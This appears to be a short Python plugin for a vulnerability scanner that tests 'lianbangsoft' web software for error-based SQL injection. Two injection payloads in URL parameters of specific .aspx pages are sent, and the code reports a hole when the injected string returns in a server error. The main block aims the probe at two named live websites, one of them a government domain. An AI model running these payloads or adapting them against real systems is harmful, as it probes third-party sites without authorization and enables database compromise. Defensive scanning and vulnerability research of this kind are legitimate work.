#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
author: Smeet
name: lianbangsoft_sp_3_sqli
refer:http://www.wooyun.org/tests/wooyun-2010-0122708

'''

def assign(service, arg):
    if service == 'lianbangsoft':
        return True, arg
        
def audit(arg):
    payloads=[
    "workplate/base/org/WebUserList.aspx?id=convert(int,%27test%27%2b%27vul%27)",
    "workplate/xzsp/gxxt/tjfx/spsl.aspx?xksxID=convert(int,%27test%27%2b%27vul%27)"
    ]
    for i in payloads:
        code, _, res, _, _url =curl.curl2(arg+i)
        if 'testvul' in res and code == 500:
            security_hole(arg+i)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lianbangsoft', 'http://xzfw.wulian.gov.cn/')[1])
    audit(assign('lianbangsoft', 'http://www.qxxzfwzx.com/')[1])